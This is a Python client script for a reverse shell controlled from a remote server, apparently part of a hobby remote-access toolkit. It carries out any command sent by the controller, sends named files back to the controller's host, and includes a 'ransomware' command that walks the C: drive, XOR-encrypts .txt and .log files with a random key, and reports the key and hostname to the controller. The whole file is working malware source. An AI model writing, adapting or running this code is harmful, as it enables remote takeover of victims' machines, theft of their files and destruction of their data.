import os
import random
import socket
import string
import subprocess
import sys
import random

from threading import Thread
from queue import Queue
from datetime import datetime


# THIS IS A DEBUG VERSION USE CLIENT.PYW INSTEAD (Client.pyw only works on windows so if you are on linux use this)


# Ip address and port to connect to
HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.2.161' # Change this to your public ip if you want to use it outside of your local network
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 2022) # Change the port if you want to but make sure to change it in Client.py as well


print('Please wait while we establish a connection...')


# Connect to socket
s = socket.socket()
s.connect((HOST, PORT))

# Print server welcome message
msg = s.recv(1024).decode()
print('[*] Server:', msg)

# Example for custom command, put your code in varName (you can change the name if you want)
# varName = print('test')


# Waiting for command from host
while True:
    cmd = s.recv(1024).decode()
    # print(f'[*] receive {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    if cmd.lower() in ['h', 'help']:
        sys.stderr = object
        continue

    # This will close the connection because tcp doesnt know when the end of the file is reached so it keeps waiting for data which means the shell cannot be used anymore and it has to be killed
    if cmd.lower() in ['down', 'download']:
        yesNo = s.recv(1024).decode()
        if yesNo == 'y':
            print("\033c", end='')
            sep = '#SEP#'
            file = s.recv(1024).decode()
            file_size = os.path.getsize(file)
            if sep in file:
                print('Warning invalid filename')
                exit(-1)
            s.send(f'{file}{sep}{file_size}'.encode())
            with open(file, 'rb') as f:
                while True:
                    file_bytes = f.read(1024)
                    if not file_bytes:
                        break
                    s.sendall(file_bytes)
            print('Download complete closing...')
            s.close()
            sys.stderr = object
        elif yesNo == 'n':
            continue

    # The encryption cannot be reverted
    if cmd.lower() in ['rw', 'encrypt', 'ransomware']:
        if os.name != 'nt':
            s.send('nnt'.encode())
            continue
        else:
            s.send('nt'.encode())
            encrypted_ext = ['.txt', '.log']    # Add extensions here
            file_paths = []
            for root, dirs, files in os.walk('C:\\'):
                for file in files:
                    file_path, file_ext = os.path.splitext(root + '\\' + file)
                    if file_ext in encrypted_ext:
                        file_paths.append(root + '\\' + file)
            key = ''
            encyption = 512 // 8
            char_pool = ''
            for i in range(0x00, 0xFF):
                char_pool += (chr(i))
            for i in range(encyption):
                key += random.choice(char_pool)
            q = Queue()
            for file in file_paths:
                q.put(file)
            def encrypt(key):
                while q.not_empty:
                    file = q.get()
                    index = 0
                    max_index = encyption - 1
                    try:
                        with open(file, 'rb') as f:
                            data = f.read()
                        with open(file, 'wb') as f:
                            for byte in data:
                                xor_byte = byte ^ ord(key[index])
                                f.write(xor_byte.to_bytes(1, 'little'))
                                if index >= max_index:
                                    index = 0
                                else:
                                    index += 1
                    except:
                        pass
                    q.task_done()
            for i in range(30):
                thread = Thread(target=encrypt, args=(key,))
                thread.start()
            time = datetime.now()
            hostname = os.getenv('COMPUTERNAME')
            s.send(f'{time} - [{hostname}] : [{key}]'.encode('utf-8'))
            q.join()
            s.send('Ecnryption successful...'.encode())
            sys.stderr = object
        
    # To add your own command remove the # below and change alias with the command alias and command with the command name
    # Make sure to add it to RevShellServer.py as well
    # if cmd.lower() in ['alias', 'command']:
        # s.send(varName.encode())

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'OK'.encode()

    s.send(result)

s.close()
